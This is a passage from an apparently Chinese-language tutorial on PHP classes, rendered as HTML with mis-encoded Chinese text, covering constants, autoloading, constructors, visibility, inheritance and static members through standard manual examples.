<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="comment">// é”™è¯¯çš„å±æ€§å£°æ˜</span></span><br><span class="line">   <span class="keyword">public</span> $var1 = <span class="string">'hello '</span> . <span class="string">'world'</span>;</span><br><span class="line">   <span class="keyword">public</span> $var2 = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">hello world</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line">   <span class="keyword">public</span> $var3 = <span class="number">1</span>+<span class="number">2</span>;</span><br><span class="line">   <span class="keyword">public</span> $var4 = <span class="keyword">self</span>::myStaticMethod();</span><br><span class="line">   <span class="keyword">public</span> $var5 = $myVar;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// æ­£ç¡®çš„å±æ€§å£°æ˜</span></span><br><span class="line">   <span class="keyword">public</span> $var6 = myConstant;</span><br><span class="line">   <span class="keyword">public</span> $var7 = <span class="keyword">array</span>(<span class="keyword">true</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//åœ¨ PHP 5.3.0 åŠä¹‹åï¼Œä¸‹é¢çš„å£°æ˜ä¹Ÿæ­£ç¡®(newdoc)</span></span><br><span class="line">   <span class="keyword">public</span> $var8 = <span class="string">&lt;&lt;&lt;'EOD'</span></span><br><span class="line"><span class="string">hello world</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="ç±»å¸¸é‡"><a href="#ç±»å¸¸é‡" class="headerlink" title="ç±»å¸¸é‡"></a>ç±»å¸¸é‡</h3><p>å¯ä»¥æŠŠåœ¨ç±»ä¸­å§‹ç»ˆä¿æŒä¸å˜çš„å€¼å®šä¹‰ä¸ºå¸¸é‡ã€‚åœ¨å®šä¹‰å’Œä½¿ç”¨å¸¸é‡çš„æ—¶å€™ä¸éœ€è¦ä½¿ç”¨ $ ç¬¦å·ã€‚</p>
<p>å¸¸é‡çš„å€¼å¿…é¡»æ˜¯ä¸€ä¸ªå®šå€¼ï¼Œä¸èƒ½æ˜¯å˜é‡ï¼Œç±»å±æ€§ï¼Œæ•°å­¦è¿ç®—çš„ç»“æœæˆ–å‡½æ•°è°ƒç”¨ã€‚</p>
<p>å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> constant = <span class="string">'constant value'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showConstant</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="keyword">self</span>::constant . <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> MyClass::constant . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$classname = <span class="string">"MyClass"</span>;</span><br><span class="line"><span class="keyword">echo</span> $classname::constant . <span class="string">"\n"</span>; <span class="comment">// è‡ª 5.3.0 èµ·</span></span><br><span class="line"></span><br><span class="line">$class = <span class="keyword">new</span> MyClass();</span><br><span class="line">$class-&gt;showConstant();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $class::constant.<span class="string">"\n"</span>; <span class="comment">// è‡ª PHP 5.3.0 èµ·</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="ç±»çš„è‡ªåŠ¨åŠ è½½"><a href="#ç±»çš„è‡ªåŠ¨åŠ è½½" class="headerlink" title="ç±»çš„è‡ªåŠ¨åŠ è½½"></a>ç±»çš„è‡ªåŠ¨åŠ è½½</h3><p>åœ¨ç¼–å†™é¢å‘å¯¹è±¡ï¼ˆOOPï¼‰ ç¨‹åºæ—¶ï¼Œå¾ˆå¤šå¼€å‘è€…ä¸ºæ¯ä¸ªç±»æ–°å»ºä¸€ä¸ª PHP æ–‡ä»¶ã€‚ è¿™ä¼šå¸¦æ¥ä¸€ä¸ªçƒ¦æ¼ï¼šæ¯ä¸ªè„šæœ¬çš„å¼€å¤´ï¼Œéƒ½éœ€è¦åŒ…å«ï¼ˆincludeï¼‰ä¸€ä¸ªé•¿é•¿çš„åˆ—è¡¨ï¼ˆæ¯ä¸ªç±»éƒ½æœ‰ä¸ªæ–‡ä»¶ï¼‰ã€‚</p>
<p>åœ¨ PHP 5 ä¸­ï¼Œå·²ç»ä¸å†éœ€è¦è¿™æ ·äº†ã€‚ <a href="https://www.php.net/manual/zh/function.spl-autoload-register.php" target="_blank" rel="noopener">spl_autoload_register()</a> å‡½æ•°å¯ä»¥æ³¨å†Œä»»æ„æ•°é‡çš„è‡ªåŠ¨åŠ è½½å™¨ï¼Œå½“ä½¿ç”¨å°šæœªè¢«å®šä¹‰çš„ç±»ï¼ˆclassï¼‰å’Œæ¥å£ï¼ˆinterfaceï¼‰æ—¶è‡ªåŠ¨å»åŠ è½½ã€‚é€šè¿‡æ³¨å†Œè‡ªåŠ¨åŠ è½½å™¨ï¼Œè„šæœ¬å¼•æ“åœ¨ PHP å‡ºé”™å¤±è´¥å‰æœ‰äº†æœ€åä¸€ä¸ªæœºä¼šåŠ è½½æ‰€éœ€çš„ç±»ã€‚</p>
<p>è‡ªåŠ¨åŠ è½½ä¸å¯ç”¨äº PHP çš„ CLI <a href="https://www.php.net/manual/zh/features.commandline.php" target="_blank" rel="noopener">äº¤äº’æ¨¡å¼</a>ã€‚</p>
<p>å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span> <span class="params">($class_name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> $class_name . <span class="string">'.php'</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$obj  = <span class="keyword">new</span> MyClass1();</span><br><span class="line">$obj2 = <span class="keyword">new</span> MyClass2();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="æ„é€ å‡½æ•°å’Œææ„å‡½æ•°"><a href="#æ„é€ å‡½æ•°å’Œææ„å‡½æ•°" class="headerlink" title="æ„é€ å‡½æ•°å’Œææ„å‡½æ•°"></a>æ„é€ å‡½æ•°å’Œææ„å‡½æ•°</h3><h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p>åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ã€‚åˆå§‹åŒ–ã€‚</p>
<blockquote>
<p><strong>Note</strong>: å¦‚æœå­ç±»ä¸­å®šä¹‰äº†æ„é€ å‡½æ•°åˆ™ä¸ä¼šéšå¼è°ƒç”¨å…¶çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚è¦æ‰§è¡Œçˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œéœ€è¦åœ¨å­ç±»çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨ **parent::__construct()**ã€‚å¦‚æœå­ç±»æ²¡æœ‰å®šä¹‰æ„é€ å‡½æ•°åˆ™ä¼šå¦‚åŒä¸€ä¸ªæ™®é€šçš„ç±»æ–¹æ³•ä¸€æ ·ä»çˆ¶ç±»ç»§æ‰¿ï¼ˆå‡å¦‚æ²¡æœ‰è¢«å®šä¹‰ä¸º private çš„è¯ï¼‰ã€‚</p>
</blockquote>
<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚</p>
<p>å’Œæ„é€ å‡½æ•°ä¸€æ ·ï¼Œçˆ¶ç±»çš„ææ„å‡½æ•°ä¸ä¼šè¢«å¼•æ“æš—ä¸­è°ƒç”¨ã€‚è¦æ‰§è¡Œçˆ¶ç±»çš„ææ„å‡½æ•°ï¼Œå¿…é¡»åœ¨å­ç±»çš„ææ„å‡½æ•°ä½“ä¸­æ˜¾å¼è°ƒç”¨ **parent::__destruct()**ã€‚æ­¤å¤–ä¹Ÿå’Œæ„é€ å‡½æ•°ä¸€æ ·ï¼Œå­ç±»å¦‚æœè‡ªå·±æ²¡æœ‰å®šä¹‰ææ„å‡½æ•°åˆ™ä¼šç»§æ‰¿çˆ¶ç±»çš„ã€‚</p>
<p>ææ„å‡½æ•°å³ä½¿åœ¨ä½¿ç”¨ <a href="https://www.php.net/manual/zh/function.exit.php" target="_blank" rel="noopener">exit()</a> ç»ˆæ­¢è„šæœ¬è¿è¡Œæ—¶ä¹Ÿä¼šè¢«è°ƒç”¨ã€‚åœ¨ææ„å‡½æ•°ä¸­è°ƒç”¨ <a href="https://www.php.net/manual/zh/function.exit.php" target="_blank" rel="noopener">exit()</a> å°†ä¼šä¸­æ­¢å…¶ä½™å…³é—­æ“ä½œçš„è¿è¡Œã€‚</p>
<blockquote>
<p><strong>Note</strong>: è¯•å›¾åœ¨ææ„å‡½æ•°ï¼ˆåœ¨è„šæœ¬ç»ˆæ­¢æ—¶è¢«è°ƒç”¨ï¼‰ä¸­æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ä¼šå¯¼è‡´è‡´å‘½é”™è¯¯ã€‚</p>
</blockquote>
<h3 id="è®¿é—®æ§åˆ¶ï¼ˆå¯è§æ€§ï¼‰"><a href="#è®¿é—®æ§åˆ¶ï¼ˆå¯è§æ€§ï¼‰" class="headerlink" title="è®¿é—®æ§åˆ¶ï¼ˆå¯è§æ€§ï¼‰"></a>è®¿é—®æ§åˆ¶ï¼ˆå¯è§æ€§ï¼‰</h3><p>å¯¹å±æ€§æˆ–æ–¹æ³•çš„è®¿é—®æ§åˆ¶ï¼Œæ˜¯é€šè¿‡åœ¨å‰é¢æ·»åŠ å…³é”®å­— <em>public</em>ï¼ˆå…¬æœ‰ï¼‰ï¼Œ<em>protected</em>ï¼ˆå—ä¿æŠ¤ï¼‰æˆ– <em>private</em>ï¼ˆç§æœ‰ï¼‰æ¥å®ç°çš„ã€‚è¢«å®šä¹‰ä¸ºå…¬æœ‰çš„ç±»æˆå‘˜å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è¢«è®¿é—®ã€‚è¢«å®šä¹‰ä¸ºå—ä¿æŠ¤çš„ç±»æˆå‘˜åˆ™å¯ä»¥è¢«å…¶è‡ªèº«ä»¥åŠå…¶å­ç±»å’Œçˆ¶ç±»è®¿é—®ã€‚è¢«å®šä¹‰ä¸ºç§æœ‰çš„ç±»æˆå‘˜åˆ™åªèƒ½è¢«å…¶å®šä¹‰æ‰€åœ¨çš„ç±»è®¿é—®ã€‚</p>
<h4 id="å±æ€§-1"><a href="#å±æ€§-1" class="headerlink" title="å±æ€§"></a>å±æ€§</h4><p>ç±»å±æ€§å¿…é¡»å®šä¹‰ä¸ºå…¬æœ‰ï¼Œå—ä¿æŠ¤ï¼Œç§æœ‰ä¹‹ä¸€ã€‚å¦‚æœç”¨ <em>var</em> å®šä¹‰ï¼Œåˆ™è¢«è§†ä¸ºå…¬æœ‰ã€‚</p>
<p>å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define MyClass</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $public = <span class="string">'Public'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $protected = <span class="string">'Protected'</span>;</span><br><span class="line">    <span class="keyword">private</span> $private = <span class="string">'Private'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">printHello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> MyClass();</span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;public; <span class="comment">// è¿™è¡Œèƒ½è¢«æ­£å¸¸æ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;protected; <span class="comment">// è¿™è¡Œä¼šäº§ç”Ÿä¸€ä¸ªè‡´å‘½é”™è¯¯</span></span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;private; <span class="comment">// è¿™è¡Œä¹Ÿä¼šäº§ç”Ÿä¸€ä¸ªè‡´å‘½é”™è¯¯</span></span><br><span class="line">$obj-&gt;printHello(); <span class="comment">// è¾“å‡º Publicã€Protected å’Œ Private</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define MyClass2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// å¯ä»¥å¯¹ public å’Œ protected è¿›è¡Œé‡å®šä¹‰ï¼Œä½† private è€Œä¸èƒ½</span></span><br><span class="line">    <span class="keyword">protected</span> $protected = <span class="string">'Protected2'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">printHello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj2 = <span class="keyword">new</span> MyClass2();</span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;public; <span class="comment">// è¿™è¡Œèƒ½è¢«æ­£å¸¸æ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;private; <span class="comment">// æœªå®šä¹‰ private</span></span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;protected; <span class="comment">// è¿™è¡Œä¼šäº§ç”Ÿä¸€ä¸ªè‡´å‘½é”™è¯¯</span></span><br><span class="line">$obj2-&gt;printHello(); <span class="comment">// è¾“å‡º Publicã€Protected2 å’Œ Undefined</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h4><p>ç±»ä¸­çš„æ–¹æ³•å¯ä»¥è¢«å®šä¹‰ä¸ºå…¬æœ‰ï¼Œç§æœ‰æˆ–å—ä¿æŠ¤ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®è¿™äº›å…³é”®å­—ï¼Œåˆ™è¯¥æ–¹æ³•é»˜è®¤ä¸ºå…¬æœ‰ã€‚</p>
<p>å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define MyClass</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// å£°æ˜ä¸€ä¸ªå…¬æœ‰çš„æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å£°æ˜ä¸€ä¸ªå…¬æœ‰çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPublic</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å£°æ˜ä¸€ä¸ªå—ä¿æŠ¤çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">MyProtected</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å£°æ˜ä¸€ä¸ªç§æœ‰çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPrivate</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ­¤æ–¹æ³•ä¸ºå…¬æœ‰</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyPrivate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myclass = <span class="keyword">new</span> MyClass;</span><br><span class="line">$myclass-&gt;MyPublic(); <span class="comment">// è¿™è¡Œèƒ½è¢«æ­£å¸¸æ‰§è¡Œ</span></span><br><span class="line">$myclass-&gt;MyProtected(); <span class="comment">// è¿™è¡Œä¼šäº§ç”Ÿä¸€ä¸ªè‡´å‘½é”™è¯¯</span></span><br><span class="line">$myclass-&gt;MyPrivate(); <span class="comment">// è¿™è¡Œä¼šäº§ç”Ÿä¸€ä¸ªè‡´å‘½é”™è¯¯</span></span><br><span class="line">$myclass-&gt;Foo(); <span class="comment">// å…¬æœ‰ï¼Œå—ä¿æŠ¤ï¼Œç§æœ‰éƒ½å¯ä»¥æ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define MyClass2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// æ­¤æ–¹æ³•ä¸ºå…¬æœ‰</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Foo2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyPrivate(); <span class="comment">// è¿™è¡Œä¼šäº§ç”Ÿä¸€ä¸ªè‡´å‘½é”™è¯¯</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myclass2 = <span class="keyword">new</span> MyClass2;</span><br><span class="line">$myclass2-&gt;MyPublic(); <span class="comment">// è¿™è¡Œèƒ½è¢«æ­£å¸¸æ‰§è¡Œ</span></span><br><span class="line">$myclass2-&gt;Foo2(); <span class="comment">// å…¬æœ‰çš„å’Œå—ä¿æŠ¤çš„éƒ½å¯æ‰§è¡Œï¼Œä½†ç§æœ‰çš„ä¸è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;testPrivate();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;testPublic();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Bar::testPublic\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Bar::testPrivate\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">extends</span> <span class="title">Bar</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Foo::testPublic\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Foo::testPrivate\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myFoo = <span class="keyword">new</span> foo();</span><br><span class="line">$myFoo-&gt;test(); <span class="comment">// Bar::testPrivate </span></span><br><span class="line">                <span class="comment">// Foo::testPublic</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><p>å½“æ‰©å±•ä¸€ä¸ªç±»ï¼Œå­ç±»å°±ä¼šç»§æ‰¿çˆ¶ç±»æ‰€æœ‰å…¬æœ‰çš„å’Œå—ä¿æŠ¤çš„æ–¹æ³•ã€‚é™¤éå­ç±»è¦†ç›–äº†çˆ¶ç±»çš„æ–¹æ³•ï¼Œè¢«ç»§æ‰¿çš„æ–¹æ³•éƒ½ä¼šä¿ç•™å…¶åŸæœ‰åŠŸèƒ½ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bar</span> <span class="keyword">extends</span> <span class="title">foo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// codes</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="èŒƒå›´è§£ææ“ä½œç¬¦-ï¼ˆ-ï¼‰"><a href="#èŒƒå›´è§£ææ“ä½œç¬¦-ï¼ˆ-ï¼‰" class="headerlink" title="èŒƒå›´è§£ææ“ä½œç¬¦ ï¼ˆ::ï¼‰"></a>èŒƒå›´è§£ææ“ä½œç¬¦ ï¼ˆ::ï¼‰</h3><p>å¯ä»¥ç”¨äºè®¿é—®<a href="https://www.php.net/manual/zh/language.oop5.static.php" target="_blank" rel="noopener">é™æ€</a>æˆå‘˜ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.constants.php" target="_blank" rel="noopener">ç±»å¸¸é‡</a>ï¼Œè¿˜å¯ä»¥ç”¨äºè¦†ç›–ç±»ä¸­çš„å±æ€§å’Œæ–¹æ³•ã€‚</p>
<p>å®ä¾‹ï¼š</p>
<p>åœ¨ç±»å®šä¹‰å¤–éƒ¨ä½¿ç”¨ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> CONST_VALUE = <span class="string">'A constant value'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$classname = <span class="string">'MyClass'</span>;</span><br><span class="line"><span class="keyword">echo</span> $classname::CONST_VALUE; <span class="comment">// è‡ª PHP 5.3.0 èµ·</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> MyClass::CONST_VALUE;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>selfï¼Œparent å’Œ static è¿™ä¸‰ä¸ªç‰¹æ®Šçš„å…³é”®å­—æ˜¯ç”¨äºåœ¨ç±»å®šä¹‰çš„å†…éƒ¨å¯¹å…¶å±æ€§æˆ–æ–¹æ³•è¿›è¡Œè®¿é—®çš„ã€‚</p>
<p>åœ¨ç±»å®šä¹‰å†…éƒ¨ä½¿ç”¨ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OtherClass</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $my_static = <span class="string">'static var'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">doubleColon</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">parent</span>::CONST_VALUE . <span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">self</span>::$my_static . <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$classname = <span class="string">'OtherClass'</span>;</span><br><span class="line"><span class="keyword">echo</span> $classname::doubleColon(); <span class="comment">// è‡ª PHP 5.3.0 èµ·</span></span><br><span class="line"></span><br><span class="line">OtherClass::doubleColon();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">myFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"MyClass::myFunc()\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OtherClass</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// è¦†ç›–äº†çˆ¶ç±»çš„å®šä¹‰</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// ä½†è¿˜æ˜¯å¯ä»¥è°ƒç”¨çˆ¶ç±»ä¸­è¢«è¦†ç›–çš„æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">parent</span>::myFunc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"OtherClass::myFunc()\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class = <span class="keyword">new</span> OtherClass();</span><br><span class="line">$class-&gt;myFunc();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Static-1"><a href="#Static-1" class="headerlink" title="Static"></a>Static</h3><p>å£°æ˜ç±»å±æ€§æˆ–æ–¹æ³•ä¸ºé™æ€ï¼Œå°±å¯ä»¥ä¸å®ä¾‹åŒ–ç±»è€Œç›´æ¥è®¿é—®ã€‚é™æ€å±æ€§ä¸èƒ½é€šè¿‡ä¸€ä¸ªç±»å·²å®ä¾‹åŒ–çš„å¯¹è±¡æ¥è®¿é—®ï¼ˆä½†é™æ€æ–¹æ³•å¯ä»¥ï¼‰ã€‚</p>
<p>ç”±äºé™æ€æ–¹æ³•ä¸éœ€è¦é€šè¿‡å¯¹è±¡å³å¯è°ƒç”¨ï¼Œæ‰€ä»¥ä¼ªå˜é‡ $this åœ¨é™æ€æ–¹æ³•ä¸­ä¸å¯ç”¨ã€‚</p>
<p>é™æ€å±æ€§ä¸å¯ä»¥ç”±å¯¹è±¡é€šè¿‡ -&gt; æ“ä½œç¬¦æ¥è®¿é—®ã€‚</p>
